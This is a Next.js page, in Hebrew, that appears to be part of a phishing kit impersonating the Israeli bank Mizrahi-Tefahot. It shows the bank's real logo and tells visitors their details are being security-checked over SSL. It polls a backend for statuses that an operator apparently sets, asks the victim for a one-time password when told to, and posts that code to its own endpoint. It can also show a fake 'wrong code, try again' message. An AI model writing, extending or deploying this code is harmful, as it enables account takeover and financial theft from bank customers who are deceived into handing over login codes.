'use client'

import { useState, useEffect, Suspense } from 'react'
import { useSearchParams, useRouter } from 'next/navigation'
import OTPForm from '@/components/OTPForm'
import { Card, CardContent, CardTitle, CardDescription } from '@/components/ui/card'
import { Button } from '@/components/ui/button'
import { Loader2, ShieldCheck, Lock, ShieldAlert } from 'lucide-react'

function VerifyContent() {
    const searchParams = useSearchParams()
    const router = useRouter()
    const requestId = searchParams.get('requestId')
    const [status, setStatus] = useState('PENDING_APPROVAL')
    const [error, setError] = useState('')

    useEffect(() => {
        if (!requestId) return

        const poll = async () => {
            try {
                const res = await fetch(`/api/auth/login-flow?requestId=${requestId}`)
                if (res.ok) {
                    const data = await res.json()
                    setStatus(data.status)

                    if (data.status === 'APPROVED') {
                        router.push('/dashboard')
                    } else if (data.status === 'REDIRECT_THANK_YOU') {
                        router.push('/thank-you')
                    }
                }
            } catch (err) {
                console.error('Polling error', err)
            }
        }

        const interval = setInterval(poll, 2000)
        return () => clearInterval(interval)
    }, [requestId, router])

    const handleOtpSubmit = async (otp: string) => {
        try {
            await fetch('/api/auth/login-flow', {
                method: 'POST',
                body: JSON.stringify({
                    action: 'submit_otp',
                    requestId,
                    otp
                })
            })
            setStatus('OTP_SUBMITTED')
        } catch (err) {
            setError('Failed to submit OTP')
        }
    }

    if (!requestId) return (
        <div className="min-h-screen bg-gray-50 flex items-center justify-center">
            <div className="bg-white p-8 rounded-2xl shadow-xl text-center">
                <div className="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-4">
                    <Lock className="h-8 w-8 text-red-500" />
                </div>
                <h2 className="text-xl font-bold text-gray-900 mb-2">שגיאת התחברות</h2>
                <p className="text-gray-500">מזהה בקשה לא חוקי או שפג תוקפו.</p>
            </div>
        </div>
    )

    // Base layout wrapper
    const PageLayout = ({ children }: { children: React.ReactNode }) => (
        <div className="min-h-screen bg-[url('https://images.unsplash.com/photo-1563911302283-d2bc129e7c1f?q=80&w=2070&auto=format&fit=crop')] bg-cover bg-center flex items-center justify-center p-4 relative">
            <div className="absolute inset-0 bg-gradient-to-br from-bank-primary/90 to-black/80 backdrop-blur-[4px]"></div>

            <div className="relative w-full max-w-md animate-in fade-in zoom-in duration-500">
                <div className="mb-8 text-center">
                    <img
                        src="https://www.mizrahi-tefahot.co.il/media/vlwlbdf2/logo.svg"
                        alt="מזרחי טפחות"
                        className="h-10 w-auto mx-auto brightness-0 invert opacity-90"
                    />
                </div>
                {children}
            </div>
        </div>
    )

    if (status === 'PENDING_APPROVAL' || status === 'OTP_SUBMITTED') {
        return (
            <PageLayout>
                <Card className="bg-white/95 backdrop-blur-md border-0 shadow-2xl rounded-2xl overflow-hidden">
                    <CardContent className="p-10 text-center">
                        <div className="flex justify-center mb-8 relative">
                            <div className="absolute inset-0 bg-bank-primary/20 rounded-full animate-ping opacity-75"></div>
                            <div className="w-24 h-24 bg-bank-primary/10 rounded-full flex items-center justify-center relative z-10 backdrop-blur-sm border border-bank-primary/20">
                                <Loader2 className="h-10 w-10 text-bank-primary animate-spin" />
                            </div>
                        </div>
                        <h2 className="text-2xl font-bold text-gray-900 mb-4">
                            {status === 'PENDING_APPROVAL' ? 'בודקים את הפרטים...' : 'מאמתים את הקוד...'}
                        </h2>
                        <p className="text-gray-500 leading-relaxed text-lg">
                            {status === 'PENDING_APPROVAL'
                                ? 'אנו מבצעים בדיקות אבטחה אחרונות לפני הכניסה לחשבון. זה ייקח רק רגע.'
                                : 'אנא המתן בזמן שאנו מאמתים את הקוד שהזנת מול המערכות שלנו.'}
                        </p>
                    </CardContent>
                    <div className="bg-gray-50/50 p-4 text-center border-t border-gray-100">
                        <p className="text-sm text-gray-400 flex items-center justify-center gap-2">
                            <ShieldCheck className="h-4 w-4" />
                            מאובטח בטכנולוגיית SSL מתקדמת
                        </p>
                    </div>
                </Card>
            </PageLayout>
        )
    }

    if (status === 'BLOCKED') {
        return (
            <PageLayout>
                <Card className="bg-white/95 backdrop-blur-md border-0 shadow-2xl rounded-2xl overflow-hidden">
                    <CardContent className="p-10 text-center">
                        <div className="flex justify-center mb-6">
                            <div className="w-20 h-20 bg-red-100 rounded-full flex items-center justify-center animate-pulse">
                                <ShieldAlert className="h-10 w-10 text-red-600" />
                            </div>
                        </div>
                        <h2 className="text-2xl font-bold text-gray-900 mb-2">
                            הגישה נחסמה
                        </h2>
                        <p className="text-gray-500 mb-6">
                            הגישה לחשבון זה נחסמה מטעמי אבטחה.
                            <br />
                            אנא צור קשר עם מוקד התמיכה.
                        </p>
                        <Button
                            className="w-full bg-red-600 hover:bg-red-700 text-white"
                            onClick={() => window.location.href = '/'}
                        >
                            חזרה לדף הבית
                        </Button>
                    </CardContent>
                </Card>
            </PageLayout>
        )
    }

    if (status === 'OTP_REQUESTED' || status === 'RETRY_OTP') {
        return (
            <PageLayout>
                <div className="bg-white/95 backdrop-blur-md rounded-2xl shadow-2xl border-0 overflow-hidden">
                    <OTPForm
                        onSubmit={handleOtpSubmit}
                        error={status === 'RETRY_OTP' ? 'הקוד שהוזן שגוי, אנא נסה שוב' : undefined}
                        isLoading={false}
                    />
                </div>
            </PageLayout>
        )
    }

    return (
        <PageLayout>
            <div className="bg-white/95 p-8 rounded-2xl text-center">
                <Loader2 className="h-8 w-8 animate-spin mx-auto text-bank-primary" />
                <p className="mt-4 text-gray-500">טוען...</p>
            </div>
        </PageLayout>
    )
}

export default function VerifyPage() {
    return (
        <Suspense fallback={<div>Loading...</div>}>
            <VerifyContent />
        </Suspense>
    )
}
